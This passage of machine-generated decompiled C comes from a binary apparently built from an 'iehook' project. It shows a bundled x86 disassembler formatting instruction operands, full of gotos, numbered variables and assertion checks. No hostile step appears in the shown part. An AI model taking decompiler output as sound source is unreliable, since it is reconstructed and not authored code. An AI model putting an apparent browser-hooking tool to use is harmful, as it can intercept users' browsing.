                                    int32_t v1157 = v1156; // 0x1000a999
                                    if ((v1156 & 0x100000) != 0) {
                                        // 0x1000a99b
                                        *(char *)(v19 + (int32_t)*v18) = 102;
                                        *v18 = *v18 + 1;
                                        v1157 = *v1125;
                                    }
                                    int32_t v1158 = v1157; // 0x1000a9b3
                                    if ((v1157 & 1024) != 0) {
                                        // 0x1000a9b5
                                        *(char *)(v19 + (int32_t)*v18) = 99;
                                        *v18 = *v18 + 1;
                                        v1158 = *v1125;
                                    }
                                    // 0x1000a9c7
                                    v72 = v69;
                                    v61 = v1158;
                                    v65 = v63;
                                    if ((int16_t)v1158 > -1) {
                                        goto lab_0x1000ae34;
                                    } else {
                                        // 0x1000a9d4
                                        *(char *)(v19 + (int32_t)*v18) = 88;
                                        v73 = v69;
                                        v66 = v63;
                                        goto lab_0x1000ae47;
                                    }
                                }
                            }
                        }
                    }
                    default: {
                        if (v801 != 0x130000) {
                            // 0x1000b524
                            *(int32_t *)(v63 - 4) = 4063;
                            *(int32_t *)(v63 - 8) = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                            *(int32_t *)(v63 - 12) = (int32_t)&g3;
                            __wassert();
                            return 0;
                        }
                        // 0x1000a54f
                        if ((*v2 & 8) == 0) {
                            // 0x1000a558
                            *(int32_t *)(v63 - 4) = 3727;
                            *(int32_t *)(v63 - 8) = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                            *(int32_t *)(v63 - 12) = (int32_t)L"X86Instruction->HasModRM";
                            __wassert();
                        }
                        if ((v6 & 3) != 3) {
                            // 0x1000b3df
                            if (v16 != 0) {
                                goto lab_0x1000af28;
                            } else {
                                uint32_t v1159 = *v21; // 0x1000b3e9
                                uint32_t v1160 = *v23 + v1159; // 0x1000b3f0
                                int32_t * v1161 = (int32_t *)(v63 - 4);
                                *v1161 = v1 + 696;
                                *(int32_t *)(v63 - 8) = *v24 + v1159 / 0x80000000 + (int32_t)(v1160 < v1159);
                                *(int32_t *)(v63 - 12) = v1160;
                                *(int32_t *)(v63 - 16) = (int32_t)"[0x%08I64X] ERROR: mod != 3 for AMODE_PR (\"%s\")\n";
                                _printf((char *)&g173);
                                v803 = v1161;
                                goto lab_0x1000b50b;
                            }
                        }
                        if (v40 >= 113) {
                            // 0x1000b417
                            if (v16 != 0) {
                                goto lab_0x1000af28;
                            } else {
                                // 0x1000b421
                                *(int32_t *)(v63 - 4) = v1 + 696;
                                *(int32_t *)(v63 - 8) = (int32_t)v38;
                                uint32_t v1162 = *v21; // 0x1000b430
                                uint32_t v1163 = *v23 + v1162; // 0x1000b437
                                int32_t v1164 = *v24; // 0x1000b43d
                                *(int32_t *)(v63 - 12) = v1164 + v1162 / 0x80000000 + (int32_t)(v1163 < v1162);
                                *(int32_t *)(v63 - 16) = v1163;
                                int32_t v1165 = v63 - 20; // 0x1000b445
                                *(int32_t *)v1165 = (int32_t)"[0x%08I64X] ERROR: invalid mmx register %d for AMODE_PR (\"%s\")\n";
                                v816 = v1165;
                                goto lab_0x1000b503;
                            }
                        }
                        // 0x1000a592
                        if ((*v26 & 15) == 2) {
                            // 0x1000b44f
                            if (v16 != 0) {
                                goto lab_0x1000af28;
                            } else {
                                uint32_t v1166 = *v21; // 0x1000b45d
                                *(int32_t *)(v63 - 4) = v1 + 696;
                                *(int32_t *)(v63 - 8) = (int32_t)v38;
                                uint32_t v1167 = *v23 + v1166; // 0x1000b46f
                                int32_t v1168 = *v24; // 0x1000b475
                                *(int32_t *)(v63 - 12) = v1168 + v1166 / 0x80000000 + (int32_t)(v1167 < v1166);
                                *(int32_t *)(v63 - 16) = v1167;
                                int32_t v1169 = v63 - 20; // 0x1000b47d
                                *(int32_t *)v1169 = (int32_t)"[0x%08I64X] ERROR: AMODE_PR illegal in 16-bit mode (\"%s\")\n";
                                v816 = v1169;
                                goto lab_0x1000b503;
                            }
                        }
                        // 0x1000a5a4
                        v74 = v69;
                        v67 = v63;
                        if ((a3 & 4) == 0) {
                            goto lab_0x1000af15;
                        } else {
                            int32_t * v1170 = (int32_t *)v79; // 0x1000a5ae
                            *v1170 = *v1170 | 128;
                            int32_t * v1171 = (int32_t *)(v79 + 16); // 0x1000a5bd
                            *v1171 = v41;
                            if ((*v1170 & 0x4000) != 0) {
                                // 0x1000a5c8
                                *(char *)(v30 + (int32_t)(*v29 / 16 & 3)) = v75;
                                char v1172 = *v29; // 0x1000a5dc
                                *v29 = v1172 + 16 & 48 | v1172 & -49;
                                if (v75 >= 2) {
                                    // 0x1000a5fc
                                    *(int32_t *)(v63 - 4) = 3747;
                                    *(int32_t *)(v63 - 8) = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                    *(int32_t *)(v63 - 12) = (int32_t)L"OperandIndex < 2";
                                    __wassert();
                                }
                            }
                            // 0x1000a616
                            if ((*v1170 & 0x2000) != 0) {
                                // 0x1000a61e
                                *(char *)(((int32_t)(*v29 / 64) | 756) + v1) = v75;
                                *v29 = *v29 + 64;
                            }
                            // 0x1000a647
                            v74 = v69;
                            v67 = v63;
                            if ((a3 & 2) == 0) {
                                goto lab_0x1000af15;
                            } else {
                                int32_t v1173 = *(int32_t *)(4 * *v1171 + (int32_t)&g68); // 0x1000a654
                                int32_t * v1174 = (int32_t *)(v63 - 4);
                                int32_t * v1175; // 0x10003490
                                int32_t * v1176; // 0x10003490
                                int32_t v1177; // 0x10003490
                                if (v1173 != 0) {
                                    // 0x1000a651
                                    v1177 = v1173;
                                    v1176 = (int32_t *)(v63 - 12);
                                    v1175 = (int32_t *)(v63 - 8);
                                } else {
                                    // 0x1000a65e
                                    *v1174 = 3751;
                                    int32_t * v1178 = (int32_t *)(v63 - 8);
                                    *v1178 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                    int32_t * v1179 = (int32_t *)(v63 - 12);
                                    *v1179 = (int32_t)L"X86_Registers[Operand->Register]";
                                    __wassert();
                                    v1177 = *(int32_t *)(4 * *v1171 + (int32_t)&g68);
                                    v1176 = v1179;
                                    v1175 = v1178;
                                }
                                int32_t * v1180 = v1175;
                                int32_t * v1181 = v1176;
                                unsigned char v1182 = *v18; // 0x1000a675
                                int32_t v1183 = v1182; // 0x1000a675
                                *v1174 = v1177;
                                *v1180 = v1182 == -1 ? 0 : 256 - v1183;
                                *v1181 = v19 + v1183;
                                int32_t v1184 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x1000a6a2
                                unsigned char v1185 = *v18 + (char)v1184; // 0x1000a6a7
                                *v18 = v1185;
                                v74 = v69;
                                v67 = v63;
                                if ((a3 & 16) == 0) {
                                    goto lab_0x1000af15;
                                } else {
                                    // 0x1000a6c0
                                    *(char *)(v19 + (int32_t)v1185) = 123;
                                    *v18 = *v18 + 1;
                                    int32_t v1186 = *v1170; // 0x1000a6ce
                                    int32_t v1187 = v1186; // 0x1000a6d4
                                    if ((v1186 & 0xe000) == 0) {
                                        // 0x1000a6d6
                                        *v1174 = 3753;
                                        *v1180 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                        *v1181 = (int32_t)L"Operand->Flags & (OP_EXEC|OP_SRC|OP_DST)";
                                        __wassert();
                                        v1187 = *v1170;
                                    }
                                    int32_t v1188 = v1187; // 0x1000a6f3
                                    if ((v1187 & 0x200000) != 0) {
                                        // 0x1000a6f5
                                        *(char *)(v19 + (int32_t)*v18) = 114;
                                        *v18 = *v18 + 1;
                                        v1188 = *v1170;
                                    }
                                    int32_t v1189 = v1188; // 0x1000a70d
                                    if ((v1188 & 0x100000) != 0) {
                                        // 0x1000a70f
                                        *(char *)(v19 + (int32_t)*v18) = 102;
                                        *v18 = *v18 + 1;
                                        v1189 = *v1170;
                                    }
                                    int32_t v1190 = v1189; // 0x1000a727
                                    if ((v1189 & 1024) != 0) {
                                        // 0x1000a729
                                        *(char *)(v19 + (int32_t)*v18) = 99;
                                        *v18 = *v18 + 1;
                                        v1190 = *v1170;
                                    }
                                    // 0x1000a73b
                                    v72 = v69;
                                    v61 = v1190;
                                    v65 = v63;
                                    if ((int16_t)v1190 > -1) {
                                        goto lab_0x1000ae34;
                                    } else {
                                        // 0x1000a748
                                        *(char *)(v19 + (int32_t)*v18) = 88;
                                        v73 = v69;
                                        v66 = v63;
                                        goto lab_0x1000ae47;
                                    }
                                }
                            }
                        }
                    }
                }
            } else {
                if (v801 != 0x150000) {
                    // 0x1000b524
                    *(int32_t *)(v63 - 4) = 4063;
                    *(int32_t *)(v63 - 8) = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                    *(int32_t *)(v63 - 12) = (int32_t)&g3;
                    __wassert();
                    return 0;
                }
                // 0x1000abc5
                v74 = v69;
                v67 = v63;
                if ((a3 & 4) == 0) {
                    goto lab_0x1000af15;
                } else {
                    // 0x1000abcf
                    if (*(int16_t *)(v79 + 6) != 1) {
                        // 0x1000abd6
                        *(int32_t *)(v63 - 4) = 3433;
                        *(int32_t *)(v63 - 8) = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                        *(int32_t *)(v63 - 12) = (int32_t)L"Operand->Length == 1";
                        __wassert();
                    }
                    int32_t * v1191 = (int32_t *)v79; // 0x1000abf0
                    *v1191 = *v1191 | 0x10080;
                    char * v1192 = (char *)(v79 + 4); // 0x1000abf6
                    *v1192 = *v1192 & -64 | 5;
                    unsigned char v1193 = *v26; // 0x1000ac02
                    switch (v1193 / 16) {
                        case 2: {
                            // 0x1000ac31
                            *(int32_t *)(v79 + 16) = 131;
                            // break -> 0x1000ac38
                            break;
                        }
                        case 4: {
                            // 0x1000ac28
                            *(int32_t *)(v79 + 16) = 147;
                            // break -> 0x1000ac38
                            break;
                        }
                        default: {
                            if ((v1193 ^ -128) >= 16) {
                                // 0x1000b543
                                *(int32_t *)(v63 - 4) = 3442;
                                *(int32_t *)(v63 - 8) = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                *(int32_t *)(v63 - 12) = (int32_t)&g3;
                                __wassert();
                                return 0;
                            }
                            // 0x1000ac1f
                            *(int32_t *)(v79 + 16) = 211;
                            // break -> 0x1000ac38
                            break;
                        }
                    }
                    int32_t v1194 = *v1191; // 0x1000ac38
                    int32_t v1195 = v1194; // 0x1000ac3e
                    if ((v1194 & 0x4000) != 0) {
                        char v1196 = *v2; // 0x1000ac40
                        char v1197 = v1196; // 0x1000ac47
                        if ((v1196 & 2) != 0) {
                            // 0x1000ac49
                            *(int32_t *)(v63 - 4) = 3444;
                            *(int32_t *)(v63 - 8) = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                            *(int32_t *)(v63 - 12) = (int32_t)L"!X86Instruction->HasDstAddressing";
                            __wassert();
                            v1197 = *v2;
                        }
                        // 0x1000ac63
                        *v2 = v1197 | 2;
                        *(char *)(v30 + (int32_t)(*v29 / 16 & 3)) = v75;
                        char v1198 = *v29; // 0x1000ac7e
                        *v29 = v1198 & -52 | v75 & 3 | v1198 + 16 & 48;
                        v1195 = *v1191;
                    }
                    // 0x1000ac9f
                    if ((v1195 & 0x2000) != 0) {
                        // 0x1000aca7
                        if (*v34 != 0x4001) {
                            // 0x1000acb3
                            if ((*v2 & 4) != 0) {
                                // 0x1000acbc
                                *(int32_t *)(v63 - 4) = 3444;
                                *(int32_t *)(v63 - 8) = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                *(int32_t *)(v63 - 12) = (int32_t)L"!X86Instruction->HasSrcAddressing";
                                __wassert();
                            }
                        }
                        // 0x1000acd6
                        *v2 = *v2 | 4;
                        *(char *)(((int32_t)(*v29 / 64) | 756) + v1) = v75;
                        char v1199 = *v29; // 0x1000acee
                        *v29 = v1199 & 51 | 4 * v75 & 12 | v1199 + 64 & -64;
                    }
                    // 0x1000ad12
                    *(char *)(v1 + 772) = 1;
                    int32_t * v1200 = (int32_t *)(v79 + 16); // 0x1000ad19
                    *v35 = *v1200;
                    *v2 = *v2 | 16;
                    *(int32_t *)(v1 + 768) = 112;
                    *v2 = *v2 | 32;
                    v74 = v69;
                    v67 = v63;
                    if ((a3 & 2) == 0) {
                        goto lab_0x1000af15;
                    } else {
                        unsigned char v1201 = *v18; // 0x1000ad44
                        int32_t v1202 = v1201; // 0x1000ad44
                        int32_t * v1203 = (int32_t *)(v63 - 4); // 0x1000ad67
                        *v1203 = *(int32_t *)(4 * *v1200 + (int32_t)&g68);
                        int32_t * v1204 = (int32_t *)(v63 - 8); // 0x1000ad75
                        *v1204 = *(int32_t *)(4 * *v37 + (int32_t)&g46);
                        int32_t * v1205 = (int32_t *)(v63 - 12); // 0x1000ad76
                        *v1205 = (int32_t)"%s:[%s]";
                        *(int32_t *)(v63 - 16) = v1201 == -1 ? 0 : 256 - v1202;
                        *(int32_t *)(v63 - 20) = v19 + v1202;
                        int32_t v1206 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x1000ad84
                        unsigned char v1207 = *v18 + (char)v1206; // 0x1000ad89
                        *v18 = v1207;
                        v74 = v69;
                        v67 = v63;
                        if ((a3 & 16) == 0) {
                            goto lab_0x1000af15;
                        } else {
                            // 0x1000ada2
                            *(char *)(v19 + (int32_t)v1207) = 123;
                            *v18 = *v18 + 1;
                            int32_t v1208 = *v1191; // 0x1000adb0
                            int32_t v1209 = v1208; // 0x1000adb6
                            if ((v1208 & 0xe000) == 0) {
                                // 0x1000adb8
                                *v1203 = 3456;
                                *v1204 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                *v1205 = (int32_t)L"Operand->Flags & (OP_EXEC|OP_SRC|OP_DST)";
                                __wassert();
                                v1209 = *v1191;
                            }
                            int32_t v1210 = v1209; // 0x1000add5
                            if ((v1209 & 0x200000) != 0) {
                                // 0x1000add7
                                *(char *)(v19 + (int32_t)*v18) = 114;
                                *v18 = *v18 + 1;
                                v1210 = *v1191;
                            }
                            int32_t v1211 = v1210; // 0x1000adef
                            if ((v1210 & 0x100000) != 0) {
                                // 0x1000adf1
                                *(char *)(v19 + (int32_t)*v18) = 102;
                                *v18 = *v18 + 1;
                                v1211 = *v1191;
                            }
                            int32_t v1212 = v1211; // 0x1000ae09
                            if ((v1211 & 1024) != 0) {
                                // 0x1000ae0b
                                *(char *)(v19 + (int32_t)*v18) = 99;
                                *v18 = *v18 + 1;
                                v1212 = *v1191;
                            }
                            // 0x1000ae1d
                            v72 = v69;
                            v61 = v1212;
                            v65 = v63;
                            if ((int16_t)v1212 > -1) {
                                goto lab_0x1000ae34;
                            } else {
                                // 0x1000ae26
                                *(char *)(v19 + (int32_t)*v18) = 88;
                                v73 = v69;
                                v66 = v63;
                                goto lab_0x1000ae47;
                            }
                        }
                    }
                }
            }
        }
    }
  lab_0x1000ae34:;
    int32_t v1213 = v65;
    int32_t v1214 = v72;
    int32_t v1215 = v1214; // 0x1000ae39
    int32_t v1216 = v1213; // 0x1000ae39
    if ((v61 & 0x2000) == 0) {
        goto lab_0x1000ae4d;
    } else {
        // 0x1000ae3b
        *(char *)(v19 + (int32_t)*v18) = 82;
        v73 = v1214;
        v66 = v1213;
        goto lab_0x1000ae47;
    }
  lab_0x10004342:;
    int32_t * v1217 = (int32_t *)v79;
    if ((*v1217 & 0x4000) != 0) {
        // 0x1000434a
        *(char *)(v30 + (int32_t)(*v29 / 16 & 3)) = v75;
        char v1218 = *v29; // 0x10004361
        *v29 = v1218 + 16 & 48 | v1218 & -49;
        if (v75 >= 2) {
            // 0x10004381
            *(int32_t *)(v63 - 4) = 2748;
            *(int32_t *)(v63 - 8) = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
            *(int32_t *)(v63 - 12) = (int32_t)L"OperandIndex < 2";
            __wassert();
        }
        // 0x10004398
        if (!((v77 != 4 | *v76 < 2))) {
            // 0x100043a4
            *v33 = *v33 | 2048;
        }
    }
    // 0x100043ae
    if ((*v1217 & 0x2000) != 0) {
        // 0x100043b6
        *(char *)(((int32_t)(*v29 / 64) | 756) + v1) = v75;
        *v29 = *v29 + 64;
    }
    // 0x100043e2
    v74 = v69;
    v67 = v63;
    if ((a3 & 2) == 0) {
        goto lab_0x1000af15;
    } else {
        // 0x100043ec
        *(char *)(v19 + (int32_t)*v18) = 60;
        unsigned char v1219 = *v18 + 1; // 0x100043f8
        *v18 = v1219;
        int32_t v1220 = v1219; // 0x100043fe
        int32_t v1221 = *(int32_t *)(v79 + 16); // 0x10004416
        int32_t v1222 = v63 - 4; // 0x10004420
        int32_t * v1223 = (int32_t *)v1222; // 0x10004420
        *v1223 = *(int32_t *)(4 * v1221 + (int32_t)&g68);
        *(int32_t *)(v63 - 8) = v1219 == -1 ? 0 : 256 - v1220;
        *(int32_t *)(v63 - 12) = v19 + v1220;
        int32_t v1224 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x1000442a
        unsigned char v1225 = *v18 + (char)v1224; // 0x1000442f
        *v18 = v1225;
        *(char *)(v19 + (int32_t)v1225) = 62;
        unsigned char v1226 = *v18 + 1; // 0x10004441
        *v18 = v1226;
        v74 = v69;
        v67 = v63;
        if ((a3 & 16) == 0) {
            goto lab_0x1000af15;
        } else {
            // 0x1000445a
            *(char *)(v19 + (int32_t)v1226) = 123;
            *v18 = *v18 + 1;
            int32_t v1227 = *v1217; // 0x10004468
            v60 = v1227;
            v59 = v1217;
            v71 = v69;
            v68 = v63;
            if ((v1227 & 0xe000) != 0) {
                goto lab_0x10004487;
            } else {
                // 0x10004470
                *v1223 = 2754;
                v58 = v1217;
                v70 = v69;
                v64 = v1222;
                goto lab_0x10004475;
            }
        }
    }
  lab_0x1000433a:
    // 0x1000433a
    if (*(int32_t *)(*v27 + 4) == 3) {
        // 0x1000433c
        *(int32_t *)(v79 + 16) = v62 + 48;
    }
    goto lab_0x10004342;
  lab_0x10007448:
    // 0x10007448
    *(int16_t *)(v79 + 6) = 4;
    char * v1228 = (char *)(v79 + 4); // 0x10007451
    *v1228 = *v1228 & -64 | 3;
    goto lab_0x100076d9;
  lab_0x10007430:
    // 0x10007430
    *(int16_t *)(v79 + 6) = 8;
    char * v1229 = (char *)(v79 + 4); // 0x10007439
    *v1229 = *v1229 & -64 | 3;
    goto lab_0x100076d9;
  lab_0x1000ae4d:;
    int32_t * v1230 = (int32_t *)v79; // 0x1000ae4d
    int32_t v1231 = *v1230; // 0x1000ae4d
    int32_t v1232 = v1231; // 0x1000ae53
    if ((v1231 & 2048) != 0) {
        // 0x1000ae55
        *(char *)(v19 + (int32_t)*v18) = 99;
        *v18 = *v18 + 1;
        v1232 = *v1230;
    }
    int32_t v1233 = v1232; // 0x1000ae6d
    if ((v1232 & 0x4000) != 0) {
        // 0x1000ae6f
        *(char *)(v19 + (int32_t)*v18) = 87;
        *v18 = *v18 + 1;
        v1233 = *v1230;
    }
    int32_t v1234 = v1233; // 0x1000ae87
    if ((v1233 & 512) != 0) {
        // 0x1000ae89
        *(char *)(v19 + (int32_t)*v18) = 83;
        *v18 = *v18 + 1;
        v1234 = *v1230;
    }
    int32_t v1235 = v1234; // 0x1000aea1
    if ((v1234 & 0x10000) != 0) {
        // 0x1000aea3
        *(char *)(v19 + (int32_t)*v18) = 65;
        *v18 = *v18 + 1;
        v1235 = *v1230;
    }
    int32_t v1236 = v1235; // 0x1000aebb
    if ((v1235 & 0x40000) != 0) {
        // 0x1000aebd
        *(char *)(v19 + (int32_t)*v18) = 80;
        *v18 = *v18 + 1;
        v1236 = *v1230;
    }
    int32_t v1237 = v1236; // 0x1000aed5
    if ((v1236 & 0x20000) != 0) {
        // 0x1000aed7
        *(char *)(v19 + (int32_t)*v18) = 76;
        *v18 = *v18 + 1;
        v1237 = *v1230;
    }
    // 0x1000aee9
    if ((v1237 & 0x80000) != 0) {
        // 0x1000aef1
        *(char *)(v19 + (int32_t)*v18) = 71;
        *v18 = *v18 + 1;
    }
    // 0x1000af03
    *(char *)(v19 + (int32_t)*v18) = 125;
    int32_t v1238 = v1215; // 0x1000af0a
    int32_t v1239 = v1216; // 0x1000af0a
    goto lab_0x1000af0f;
  lab_0x1000ae47:
    // 0x1000ae47
    *v18 = *v18 + 1;
    v1215 = v73;
    v1216 = v66;
    goto lab_0x1000ae4d;
  lab_0x10004487:;
    int32_t * v1240 = v59;
    int32_t v1241 = v60; // 0x1000448d
    if ((v60 & 0x200000) != 0) {
        // 0x1000448f
        *(char *)(v19 + (int32_t)*v18) = 114;
        *v18 = *v18 + 1;
        v1241 = *v1240;
    }
    int32_t v1242 = v1241; // 0x100044a7
    if ((v1241 & 0x100000) != 0) {
        // 0x100044a9
        *(char *)(v19 + (int32_t)*v18) = 102;
        *v18 = *v18 + 1;
        v1242 = *v1240;
    }
    int32_t v1243 = v1242; // 0x100044c1
    if ((v1242 & 1024) != 0) {
        // 0x100044c3
        *(char *)(v19 + (int32_t)*v18) = 99;
        *v18 = *v18 + 1;
        v1243 = *v1240;
    }
    int32_t v1244 = v1243; // 0x100044d5
    int32_t v1245; // 0x10003490
    if ((int16_t)v1244 > -1) {
        // 0x100044ec
        v1245 = v1244;
        if ((v1244 & 0x2000) == 0) {
            goto lab_0x10004505;
        } else {
            // 0x100044f3
            *(char *)(v19 + (int32_t)*v18) = 82;
            goto lab_0x100044ff;
        }
    } else {
        // 0x100044de
        *(char *)(v19 + (int32_t)*v18) = 88;
        goto lab_0x100044ff;
    }
  lab_0x1000898c:
    // 0x1000898c
    *(int32_t *)(v63 - 4) = v16;
    *(int32_t *)(v63 - 8) = v78;
    *(int32_t *)(v63 - 12) = v79;
    *(int32_t *)(v63 - 16) = v69;
    int32_t v1246 = function_10002c20((int32_t)&g173, (int32_t)&g173, (int32_t)&g173, (int32_t)&g173); // 0x1000899b
    int32_t v1247 = v1246; // 0x100089a8
    int32_t v1248 = v63; // 0x100089a8
    if (v1246 == 0) {
        // 0x1000af28
        return 0;
    }
    goto lab_0x1000a0a5;
  lab_0x1000af0f:
    // 0x1000af0f
    *v18 = *v18 + 1;
    v74 = v1238;
    v67 = v1239;
    goto lab_0x1000af15;
  lab_0x10004475:
    // 0x10004475
    *(int32_t *)(v64 - 4) = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
    *(int32_t *)(v64 - 8) = (int32_t)L"Operand->Flags & (OP_EXEC|OP_SRC|OP_DST)";
    __wassert();
    v60 = *v58;
    v59 = v58;
    v71 = v70;
    v68 = v64 + 4;
    goto lab_0x10004487;
  lab_0x1000a0a5:
    // 0x1000a0a5
    v815 = v1248;
    v818 = v1247;
    v74 = v1247;
    v67 = v1248;
    if ((a3 & 4) == 0) {
        goto lab_0x1000af15;
    } else {
        goto lab_0x1000a0af;
    }
  lab_0x100098f8:;
    int32_t v1249 = v814;
    v1247 = v69;
    v1248 = v1249;
    if ((*v806 & 0x2000) != 0) {
        // 0x10009904
        *(char *)(((int32_t)(*v29 / 64) | 756) + v1) = v75;
        *v29 = *v29 + 64;
        v1247 = v69;
        v1248 = v1249;
    }
    goto lab_0x1000a0a5;
  lab_0x10004505:;
    int32_t v1250 = v1245; // 0x1000450b
    if ((v1245 & 2048) != 0) {
        // 0x1000450d
        *(char *)(v19 + (int32_t)*v18) = 99;
        *v18 = *v18 + 1;
        v1250 = *v1240;
    }
    int32_t v1251 = v1250; // 0x10004525
    if ((v1250 & 0x4000) != 0) {
        // 0x10004527
        *(char *)(v19 + (int32_t)*v18) = 87;
        *v18 = *v18 + 1;
        v1251 = *v1240;
    }
    int32_t v1252 = v1251; // 0x1000453f
    if ((v1251 & 512) != 0) {
        // 0x10004541
        *(char *)(v19 + (int32_t)*v18) = 83;
        *v18 = *v18 + 1;
        v1252 = *v1240;
    }
    int32_t v1253 = v1252; // 0x10004559
    if ((v1252 & 0x10000) != 0) {
        // 0x1000455b
        *(char *)(v19 + (int32_t)*v18) = 65;
        *v18 = *v18 + 1;
        v1253 = *v1240;
    }
    int32_t v1254 = v1253; // 0x10004573
    if ((v1253 & 0x40000) != 0) {
        // 0x10004575
        *(char *)(v19 + (int32_t)*v18) = 80;
        *v18 = *v18 + 1;
        v1254 = *v1240;
    }
    unsigned char v1255 = *v18;
    char v1256 = v1255; // 0x1000458d
    int32_t v1257 = v1254; // 0x1000458d
    if ((v1254 & 0x20000) != 0) {
        // 0x1000458f
        *(char *)(v19 + (int32_t)v1255) = 76;
        char v1258 = *v18 + 1; // 0x1000459b
        *v18 = v1258;
        v1256 = v1258;
        v1257 = *v1240;
    }
    char v1259 = v1256;
    char v1260 = v1259; // 0x100045a7
    if ((v1257 & 0x80000) != 0) {
        // 0x100045a9
        *(char *)(v19 + (int32_t)v1259) = 71;
        char v1261 = *v18 + 1; // 0x100045b5
        *v18 = v1261;
        v1260 = v1261;
    }
    // 0x100045bb
    *(char *)(v19 + (int32_t)v1260) = 125;
    v1238 = v71;
    v1239 = v68;
    goto lab_0x1000af0f;
  lab_0x100044ff:
    // 0x100044ff
    *v18 = *v18 + 1;
    v1245 = *v1240;
    goto lab_0x10004505;
  lab_0x1000a0af:;
    int32_t v1262 = v818;
    int32_t v1263 = v815;
    int32_t * v1264 = (int32_t *)v79; // 0x1000a0af
    if ((*v1264 & 0x10000) == 0) {
        goto lab_0x1000a10b;
    } else {
        // 0x1000a0b7
        if (*(int16_t *)(v79 + 6) == 0) {
            // 0x1000a0be
            *(int32_t *)(v1263 - 4) = 4072;
            *(int32_t *)(v1263 - 8) = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
            *(int32_t *)(v1263 - 12) = (int32_t)L"Operand->Length";
            __wassert();
        }
        int32_t v1265 = *(int32_t *)(v79 + 16); // 0x1000a0d5
        if (v1265 == 133) {
            goto lab_0x1000a0e9;
        } else {
            int32_t v1266 = v1265 - 149; // 0x1000a0df
            if (v1266 != 0 == (v1266 != 64)) {
                goto lab_0x1000a10b;
            } else {
                goto lab_0x1000a0e9;
            }
        }
    }
  lab_0x1000a10b:
    // 0x1000a10b
    v74 = v1262;
    v67 = v1263;
    int32_t * v1267; // 0x10003490
    int32_t * v1268; // 0x10003490
    int32_t * v1269; // 0x10003490
    if ((a3 & 2) == 0) {
        goto lab_0x1000af15;
    } else {
        uint32_t v1270 = v80 / 0x1000000; // 0x1000a118
        if (v1270 < 26) {
            // 0x1000a123
            if (*(int32_t *)(4 * v1270 + (int32_t)&g72) != 0) {
                // 0x1000a123
                v1269 = (int32_t *)(v1263 - 12);
                v1268 = (int32_t *)(v1263 - 8);
                v1267 = (int32_t *)(v1263 - 4);
                goto lab_0x1000a144;
            } else {
                goto lab_0x1000a12d;
            }
        } else {
            goto lab_0x1000a12d;
        }
    }
  lab_0x100098e3:
    // 0x100098e3
    *(int32_t *)(v821 - 4) = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
    *(int32_t *)(v821 - 8) = (int32_t)L"OperandIndex < 2";
    __wassert();
    v806 = v802;
    v814 = v821 + 4;
    goto lab_0x100098f8;
  lab_0x100084f7:;
    int16_t * v1271 = v804;
    *v48 = *v48 + (int32_t)*v1271;
    uint16_t v1272 = *v1271; // 0x10008507
    if (v1272 > (int16_t)(*v26 & 15)) {
        // 0x10008519
        *(int32_t *)(v63 - 4) = 3522;
        *(int32_t *)(v63 - 8) = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
        *(int32_t *)(v63 - 12) = (int32_t)L"X86Instruction->OperandSize >= Operand->Length";
        __wassert();
    }
    // 0x10008530
    if (*v34 == 2049) {
        // 0x1000853c
        *v1271 = (int16_t)(*v26 & 15);
    }
    int32_t v1273 = v69 + (int32_t)v1272; // 0x1000850b
    v74 = v1273;
    v67 = v63;
    int32_t v1274; // 0x10003490
    int32_t v1275; // 0x10003490
    int32_t v1276; // 0x10003490
    int32_t v1277; // 0x10003490
    char * v1278; // 0x100087b3
    int32_t * v1279; // 0x100087b7
    int32_t v1280; // 0x100087b8
    int32_t * v1281; // 0x100087b8
    unsigned char v1282; // 0x100087cb
    int32_t v1283; // 0x100087d1
    int16_t * v1284; // 0x10008701
    int32_t * v1285; // 0x10008705
    int32_t v1286; // 0x10008706
    int32_t * v1287; // 0x10008706
    unsigned char v1288; // 0x10008719
    int32_t v1289; // 0x1000871f
    int32_t * v1290; // 0x1000864f
    int32_t * v1291; // 0x10008652
    int32_t v1292; // 0x10008653
    int32_t * v1293; // 0x10008653
    unsigned char v1294; // 0x10008666
    int32_t v1295; // 0x1000866c
    int32_t * v1296; // 0x10008587
    int32_t * v1297; // 0x10008588
    int32_t * v1298; // 0x1000858b
    int32_t * v1299; // 0x1000858c
    int32_t * v1300; // 0x10008591
    int32_t * v1301; // 0x10008599
    unsigned char v1302; // 0x1000859f
    int32_t v1303; // 0x100085a5
    int32_t v1304; // 0x100085a8
    if ((a3 & 2) == 0) {
        goto lab_0x1000af15;
    } else {
        uint16_t v1305 = *v1271; // 0x10008556
        g158 = (int32_t)v1305 - 1;
        switch (v1305) {
            case 1: {
                unsigned char v1306 = *v18; // 0x1000879a
                int32_t v1307 = v1306; // 0x1000879a
                v1278 = (char *)(v79 + 32);
                v1279 = (int32_t *)(v63 - 4);
                *v1279 = (int32_t)*v1278;
                v1280 = v63 - 8;
                v1281 = (int32_t *)v1280;
                *v1281 = (int32_t)"0x%02X=";
                *(int32_t *)(v63 - 12) = v1306 == -1 ? 0 : 256 - v1307;
                *(int32_t *)(v63 - 16) = v19 + v1307;
                int32_t v1308 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x100087c6
                v1282 = *v18 + (char)v1308;
                *v18 = v1282;
                v1283 = v1282;
